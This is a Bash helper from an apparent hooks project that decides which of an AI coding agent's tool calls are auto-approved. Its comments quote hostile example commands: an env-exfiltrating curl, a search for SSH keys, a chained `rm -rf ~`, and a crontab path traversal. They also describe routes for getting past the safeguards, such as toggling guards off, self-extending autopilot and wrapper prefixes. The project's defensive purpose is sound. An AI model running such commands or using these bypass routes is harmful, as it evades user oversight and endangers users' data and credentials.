#!/usr/bin/env bash
# Claude Supercharger — Shared smart-approve verdict
# Single source of truth for "is this tool call known-safe to auto-approve?".
# Used by smart-approve.sh (to approve) AND notify-permission.sh (to SKIP the
# desktop notification for anything that gets auto-approved — otherwise the user
# is pinged for permissions they never actually have to act on). Keeping the
# decision in one place means the two hooks can never drift out of sync.
#
# Usage: smart_approve_verdict "$_INPUT"  → returns 0 if auto-approvable, else 1.
# Reads only stdin JSON fields; no side effects.

# Shared matchers — same sources of truth the guards use, so autopilot's (and the
# in-project Write allow-list's) auto-approve can never swallow a confirm a guard
# forced: critical-infra + lockfile edits, and foreign-host git pushes.
# shellcheck source=hooks/lib-critical-infra.sh
. "${BASH_SOURCE[0]%/*}/lib-critical-infra.sh"
# shellcheck source=hooks/lib-lockfile.sh
. "${BASH_SOURCE[0]%/*}/lib-lockfile.sh"
# shellcheck source=hooks/lib-git-remote.sh
. "${BASH_SOURCE[0]%/*}/lib-git-remote.sh"

# v4.0.44: never auto-approve something the USER'S OWN permissions.deny (or
# .ask) covers. Whether a hook's allow can override a deny rule is NOT documented
# — code.claude.com/docs/en/hooks says nothing about that precedence, and a
# claude-code-guide reading once asserted the opposite. inkatze/planwright hit the
# same question and was safe only by accident: its auto-approve list is read-only
# shapes with no overlap with its deny block. Ours has total overlap — autopilot
# returns 0 for EVERYTHING outside the tighten-list — so if hook-allow does win, an
# 8h window silently suspends the user's own deny rules.
#
# The fix is to stop depending on the answer: never emit allow for a call the user
# said to deny or ask about. Over-declining costs only the prompt they would have
# had anyway; under-declining is the hole. So anything unparseable — a malformed
# settings file, a rule shape we do not model, a tool whose subject we cannot
# locate — counts as COVERED.
#
# Models the documented matcher: whole-command glob (M2), `:*` = `*` (M5), a deny
# matches if ANY subcommand matches (M6), matching past leading VAR=value (M7),
# and the wrapper stripping of MB-1. Cheap gate first: the python fork happens only
# when a settings file actually carries a "deny"/"ask" key, which is the rare case.
_sa_user_rules_cover() {
  local input="$1" _ur_cwd _ur_f _ur_found=""
  _ur_cwd=$(printf '%s\n' "$input" | jq -r '.cwd // .workspace.current_dir // empty' 2>/dev/null || true)
  for _ur_f in "$HOME/.claude/settings.json" \
               ${_ur_cwd:+"$_ur_cwd/.claude/settings.json"} \
               ${_ur_cwd:+"$_ur_cwd/.claude/settings.local.json"}; do
    [ -f "$_ur_f" ] || continue
    # A non-EMPTY array only: installers write an empty deny list, and a bare key
    # test would fork python on every permission request for a user with no rules.
    # Skip only a provably EMPTY list: installers write one, and a bare key test
    # would fork python on every permission request for a user with no rules. The
    # `$` arm matters — a TRUNCATED file ends right after the bracket, and a gate
    # that skipped it would read a corrupt settings file as "no rules" (fail-open).
    grep -qE '"(deny|ask)"[[:space:]]*:[[:space:]]*\[[[:space:]]*([^]]|$)' "$_ur_f" 2>/dev/null || continue
    _ur_found="$_ur_found $_ur_f"
  done
  [ -n "$_ur_found" ] || return 1
  SC_DENY_FILES="$_ur_found" SC_INPUT="$input" python3 - <<'SC_DENY_PY'
import json, os, re, fnmatch, sys

inp = json.loads(os.environ.get('SC_INPUT') or '{}')
tool = inp.get('tool_name') or ''
ti = inp.get('tool_input') or {}

rules = []
for f in (os.environ.get('SC_DENY_FILES') or '').split():
    try:
        d = json.load(open(f))
    except Exception:
        # An unreadable or malformed settings file must not be read as "no rules".
        sys.exit(0)
    p = d.get('permissions') or {}
    for k in ('deny', 'ask'):
        v = p.get(k)
        if isinstance(v, list):
            rules += [r for r in v if isinstance(r, str)]

if not rules:
    sys.exit(1)

SUBJECT = {
    'Bash': 'command', 'PowerShell': 'command',
    'Read': 'file_path', 'Write': 'file_path', 'Edit': 'file_path',
    'MultiEdit': 'file_path', 'NotebookEdit': 'notebook_path',
    'WebFetch': 'url', 'WebSearch': 'query',
}
key = SUBJECT.get(tool)
subject = ti.get(key) if key else None
if key == 'file_path' and not subject:
    subject = ti.get('notebook_path')

ENV = re.compile(r'^\s*(?:[A-Za-z_][A-Za-z0-9_]*=(?:"[^"]*"|\'[^\']*\'|\S*)\s+)*')
# MB-1: Claude Code strips these leading wrappers before matching; we strip them
# too, so `timeout 30 <denied>` cannot slip past a rule that covers <denied>.
WRAP = re.compile(r'^(?:timeout\s+\S+|time|nice(?:\s+-n\s*\S+)?|nohup|stdbuf(?:\s+-\S+)*|command|builtin|noglob|xargs)\s+')

def parts(cmd):
    # M6: a deny matches if ANY subcommand matches. M7: match past leading VAR=value.
    subs = re.split(r'&&|\|\||\|&|;|\||&|\n', cmd)
    out = []
    for s in subs:
        s = s.strip()
        if not s:
            continue
        for v in (s, ENV.sub('', s).strip()):
            out.append(v)
            w = WRAP.sub('', v).strip()
            while w != v:
                out.append(w)
                v, w = w, WRAP.sub('', w).strip()
    return out or [cmd]

for r in rules:
    m = re.match(r'^([A-Za-z_][A-Za-z0-9_]*)(?:\((.*)\))?$', r.strip())
    if not m:
        continue                      # unparseable rule: cannot judge, do not claim clean
    rtool, pat = m.group(1), m.group(2)
    if rtool != tool:
        continue
    if pat is None:                   # bare tool name — covers every call
        sys.exit(0)
    if subject is None:               # a pattern we have no subject for
        sys.exit(0)                   # conservative: assume covered
    pat = pat.strip()
    if pat.endswith(':*'):            # M5
        pat = pat[:-2] + '*'
    cands = parts(subject) if tool in ('Bash', 'PowerShell') else [subject]
    for c in cands:
        if fnmatch.fnmatchcase(c, pat):
            sys.exit(0)

sys.exit(1)
SC_DENY_PY
}

smart_approve_verdict() {
  local input="$1"
  local tool_name project_dir file_path abs_path command agent_id

  # Time-boxed modes, evaluated before any allow-list — tighten beats loosen:
  #   /sc-strict    → auto-approve NOTHING (return 1): every call falls through to the
  #                   normal permission prompt. Checked FIRST so it overrides autopilot.
  #   /sc-autopilot → auto-approve EVERYTHING (return 0): no prompts.
  # (/sc-readonly tightens separately, as a PreToolUse deny, and beats both there.)
  # The PreToolUse safety hooks run independently and still block dangerous calls
  # regardless of mode. Each mode is time-boxed with per-request expiry (no timer),
  # per-session (…-<session-id>) or global. Session id comes from the request (matches
  # the writers' CLAUDE_CODE_SESSION_ID); same SUPERCHARGER_STATE the writers use.
  local _md_state _md_sid _md_now _md_f _md_until
  _md_state="${SUPERCHARGER_STATE:-${CLAUDE_PLUGIN_DATA:-$HOME/.claude/supercharger}}"
  _md_sid=$(printf '%s\n' "$input" | jq -r '.session_id // empty' 2>/dev/null || true)
  _md_now=""   # P2: computed lazily on the first existing mode file — avoids a
               # `date` fork on every permission request in the common no-mode path.
  # Strict first — must override autopilot.
  for _md_f in "$_md_state/scope/.strict-until" ${_md_sid:+"$_md_state/scope/.strict-until-$_md_sid"}; do
    [ -f "$_md_f" ] || continue
    [ -z "$_md_now" ] && _md_now=$(date +%s 2>/dev/null || echo 0)
    _md_until=$(cat "$_md_f" 2>/dev/null || echo 0)
    if printf '%s' "$_md_until" | grep -qE '^[0-9]+$' && [ "$_md_until" -gt "$_md_now" ]; then
      return 1
    fi
  done
  # Critical-infra edits (CI/CD, container, migrations, auth) are never auto-approved —
  # not even under autopilot. critical-infra-guard emits permissionDecision "ask"; this
  # return 1 (placed BEFORE the autopilot loop so autopilot's return 0 can't win first)
  # keeps that mandatory confirm from being swallowed. Tighten beats loosen.
  local _ci_tool _ci_path
  _ci_tool=$(printf '%s\n' "$input" | jq -r '.tool_name // empty' 2>/dev/null || true)

  # v2.26.1: turning Supercharger OFF is never auto-approved.
  #
  # `sc-toggle.sh off` sets the kill-switch, after which EVERY guard exits 0 — so the
  # three-step "disable, act, re-enable" makes every other protection here moot. The
  # toggle is a legitimate user control, so it cannot be denied outright; what must not
  # happen is it going through unseen. Measured before writing this: the toggle command
  # passed harness-tamper, safety and path-guard, and with the flag set both safety and
  # path-guard then allowed a settings.json write they otherwise deny.
  #
  # Placed here, before the autopilot loop, for the same reason as critical-infra:
  # autopilot returns 0 for everything, so a later decline would be swallowed exactly
  # when the user is least likely to be watching. Tighten beats loosen.
  if [ "$_ci_tool" = "Bash" ] || [ "$_ci_tool" = "PowerShell" ]; then
    local _sc_cmd
    _sc_cmd=$(printf '%s\n' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null || true)
    case "$_sc_cmd" in
      *sc-toggle*off*|*sc-toggle*disable*) return 1 ;;
      # v2.26.23: hook-toggle disabling a security guard carries the same confirm,
      # and must be declined here too — otherwise an active autopilot window
      # auto-approves it, which is exactly when nobody is watching.
      # v2.26.24: same for trusting an MCP server — a credential-harvest enabler must
      # not be auto-approved by an active autopilot window.
      *trust-mcp*)
        case "$_sc_cmd" in
          *--remove*|*--rm*|*--list*|*--untrust*) : ;;
          *) return 1 ;;
        esac ;;
      *hook-toggle*off*)
        case "$_sc_cmd" in
          *safety*|*path-guard*|*harness-tamper*|*git-safety*|*env-file-guard*|*secret*|*injection*|*egress*|*code-security*|*commit-guard*|*subagent-safety*|*readonly*|*critical-infra*|*memory-write*|*notebook-exec*|*cloud-cli*|*bulk-exfil*|*mcp-*) return 1 ;;
        esac ;;
      # v2.26.74: the time-boxed modes carry a confirm too (harness-tamper-guard), and
      # it must be declined HERE for the same reason as the three above — an already
      # active autopilot window would otherwise auto-approve its own EXTENSION, and
      # `readonly off` / `strict off`, without the confirm ever reaching the user.
      # The glob is the cheap gate; the shape regex only forks in that rare case.
      *autopilot.sh*|*readonly.sh*|*strict.sh*)
        # v2.26.82: quote moved AFTER the whitespace — see harness-tamper-guard.
        # These two patterns must stay identical: if the guard asks and this does
        # not decline, an open autopilot window auto-approves its own renewal.
        printf '%s' "$_sc_cmd" \
          | grep -Eq 'autopilot\.sh[[:space:]]+["'\'']?[0-9]|(readonly|strict)\.sh[[:space:]]+["'\'']?off' \
          && return 1 ;;
    esac
  fi

  case "$_ci_tool" in
    Write|Edit|MultiEdit|NotebookEdit)
      _ci_path=$(printf '%s\n' "$input" | jq -r '.tool_input.file_path // .tool_input.notebook_path // empty' 2>/dev/null || true)
      . "${BASH_SOURCE[0]%/*}/lib-toolpath.sh"; sc_norm_path _ci_path
      if [ -n "$_ci_path" ]; then
        # Both critical-infra AND lockfile edits carry a mandatory PreToolUse "ask".
        # The in-project Write allow-list below returns 0 for any project path, and
        # autopilot returns 0 for everything — so without these two declines the ask
        # is silently swallowed. Same shared matchers the guards themselves use.
        is_critical_infra_path "$_ci_path" >/dev/null 2>&1 && return 1
        is_lockfile_path "$_ci_path" && return 1
      fi
      ;;
  esac

  # Tighten beats loosen: the user's own deny/ask rules outrank every mode below,
  # including autopilot. See _sa_user_rules_cover above for why this cannot wait
  # for the platform to document its precedence.
  _sa_user_rules_cover "$input" && return 1

  # Autopilot next.
  for _md_f in "$_md_state/scope/.autopilot-until" ${_md_sid:+"$_md_state/scope/.autopilot-until-$_md_sid"}; do
    [ -f "$_md_f" ] || continue
    [ -z "$_md_now" ] && _md_now=$(date +%s 2>/dev/null || echo 0)
    _md_until=$(cat "$_md_f" 2>/dev/null || echo 0)
    if printf '%s' "$_md_until" | grep -qE '^[0-9]+$' && [ "$_md_until" -gt "$_md_now" ]; then
      # Autopilot auto-approves everything EXCEPT a foreign-host push / origin hijack:
      # git-remote-guard emits an "ask" for those, and the normal allow-list never
      # auto-approves `git push` anyway, so THIS is the only place autopilot could
      # swallow it. Fork git only when autopilot is active AND the command looks like
      # a push/set-url (the common case pays nothing extra).
      if [ "$_ci_tool" = "Bash" ]; then
        local _ap_cmd _ap_pdir
        _ap_cmd=$(printf '%s\n' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null || true)
        case "$_ap_cmd" in
          *push*|*set-url*)
            _ap_pdir=$(printf '%s\n' "$input" | jq -r '.cwd // .workspace.current_dir // empty' 2>/dev/null || true)
            [ -z "$_ap_pdir" ] && _ap_pdir="$PWD"
            [ -n "$(git_remote_exfil_reason "$_ap_cmd" "$_ap_pdir")" ] && return 1
            ;;
        esac
      fi
      return 0
    fi
  done

  tool_name="$_ci_tool"   # P2: reuse the tool_name already parsed above (was a 2nd jq)
  [ -z "$tool_name" ] && return 1

  project_dir=$(printf '%s\n' "$input" | jq -r '.cwd // .workspace.current_dir // empty' 2>/dev/null || true)
  [ -z "$project_dir" ] && project_dir="$PWD"
  agent_id=$(printf '%s\n' "$input" | jq -r '.agent_id // empty' 2>/dev/null || true)

  # Always-safe read-only tools
  case "$tool_name" in
    Read|Glob|Grep|LS|ls) return 0 ;;
  esac

  # Write/Edit inside the project directory
  if [ "$tool_name" = "Write" ] || [ "$tool_name" = "Edit" ] || [ "$tool_name" = "MultiEdit" ]; then
    file_path=$(printf '%s\n' "$input" | jq -r '.tool_input.file_path // empty' 2>/dev/null || true)
    . "${BASH_SOURCE[0]%/*}/lib-toolpath.sh"; sc_norm_path file_path
    if [ -n "$file_path" ] && [ -n "$project_dir" ]; then
      case "$file_path" in
        /*) abs_path="$file_path" ;;
        *)  abs_path="${project_dir}/${file_path}" ;;
      esac
      # v2.21: reject path traversal. abs_path is string-concatenated, NOT
      # normalized, so a relative `../../../../etc/crontab` yields
      # `$project_dir/../../../../etc/crontab`, which still glob-matches
      # `$project_dir/*` below and would auto-approve an out-of-project write.
      # Refuse any `..` path component before the in-project prefix test.
      case "$abs_path" in
        *"/../"*|*"/..") return 1 ;;
      esac
      case "$abs_path" in
        "${project_dir}"/*) return 0 ;;
      esac
    fi
    return 1
  fi

  # Bash commands
  if [ "$tool_name" = "Bash" ]; then
    command=$(printf '%s\n' "$input" | jq -r '.tool_input.command // empty' 2>/dev/null || true)
    if [ -z "$command" ]; then
      command=$(printf '%s\n' "$input" | python3 -c "import sys,json; print(json.load(sys.stdin).get('tool_input',{}).get('command',''))" 2>/dev/null || echo "")
    fi
    [ -z "$command" ] && return 1

    # Never auto-approve subagent-originated Bash (delegating a task must not
    # implicitly grant open shell access).
    [ -n "$agent_id" ] && return 1

    # v2.8.10: never auto-approve a command containing command substitution.
    # The static allow-list patterns below match on the OUTER command shape
    # (`^curl`, `^cat`, ...) and can't reason about what a `$(...)` / backtick
    # expands to — e.g. `curl "https://x/?d=$(env)"` (GET, exfil) or
    # `cat $(find / -name id_rsa)` would otherwise be auto-approved, skipping the
    # user's manual confirmation. Defer these to the user / CC's classifier.
    # (${VAR} plain expansion is fine — only $(...) and backticks are gated.)
    case "$command" in
      *'$('*|*'`'*) return 1 ;;
    esac

    # v2.21: never auto-approve a compound command or one using redirection.
    # The allow-list below matches only the LEADING token, so a chained
    # `grep x . && rm -rf ~`, `cat f > ~/.bashrc`, or `ls | xargs rm` would
    # otherwise be auto-approved on the strength of its first read-only word.
    # Any control operator (; & | ), redirection (< >) or newline defers to the
    # user's manual confirmation — a genuinely read-only command needs none.
    case "$command" in
      *';'*|*'&'*|*'|'*|*'<'*|*'>'*|*$'\n'*) return 1 ;;
    esac

    # --help / --version
    printf '%s\n' "$command" | grep -qE '(^|[[:space:]])--(help|version)([[:space:]]|$)' && return 0
    # Read-only shell commands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(ls|pwd|cat|head|tail|printf|which|type|grep|find|rg|wc|sort|uniq|diff|file|stat|env|printenv)([[:space:]]|$)' && return 0
    # Read-only git subcommands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*git[[:space:]]+(status|log|diff|branch|show|remote|tag|stash list|rev-parse|describe)([[:space:]]|$)' && return 0
    # command -v
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*command[[:space:]]+-v[[:space:]]' && return 0
    # Test runners
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(npm|yarn|pnpm)[[:space:]]+test([[:space:]]|$)|^[[:space:]]*(cargo|go)[[:space:]]+test([[:space:]]|$)|^[[:space:]]*pytest([[:space:]]|$)|^[[:space:]]*vitest([[:space:]]|$)|^[[:space:]]*jest([[:space:]]|$)' && return 0
    # Package manager run/build/dev commands
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(npm|yarn|pnpm|bun)[[:space:]]+(run|build|dev|start|lint|format|typecheck|type-check)([[:space:]]|$)' && return 0
    # Node/Python/Ruby running scripts — but NOT inline-eval forms
    if printf '%s\n' "$command" | grep -qE '^[[:space:]]*(node|python3?|ruby|tsx|ts-node)[[:space:]]' \
       && ! printf '%s\n' "$command" | grep -qE '(^|[[:space:]])(-e|-c|-p|--eval|--print)([[:space:]]|=|$)'; then
      return 0
    fi
    # curl — GET only
    if printf '%s\n' "$command" | grep -qE '^[[:space:]]*curl[[:space:]]'; then
      if ! printf '%s\n' "$command" | grep -qiE '(-X[[:space:]]*(POST|PUT|DELETE|PATCH)|--request[[:space:]]*(POST|PUT|DELETE|PATCH)|-d[[:space:]]|--data[[:space:]]|--data-raw[[:space:]]|--data-binary[[:space:]])'; then
        return 0
      fi
    fi
    # Build tools
    printf '%s\n' "$command" | grep -qE '^[[:space:]]*(make|cargo build|go build|tsc|gcc|g\+\+|rustc|javac)([[:space:]]|$)' && return 0

    return 1
  fi

  return 1
}
